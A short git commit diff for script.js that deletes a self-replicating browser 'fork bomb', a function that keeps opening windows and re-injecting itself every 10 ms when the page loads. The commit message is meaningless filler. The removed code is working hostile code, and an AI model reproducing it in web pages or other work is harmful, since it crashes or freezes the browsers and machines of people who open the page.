865f8823f4e611e4cce33e974bb125175bc90f99
Richard DESNOUES <70509067+Richarddesnoues@users.noreply.github.com>
2022-03-31 10:46:30 +0200

    ric
    rickmklk

--- script.js
+++ script.js
@@ -1,13 +1,4 @@
 
-function fork() {
-    const win = window.open();
-    const script = win.document.createElement("script");
-    script.innerHTML = fork + "\n" + "fork();";
-    win.document.head.appendChild(script);
-    setTimeout(function() {
-      win.close();
-      fork();
-    }, 10)
-  }
+
   
-  fork();
+  
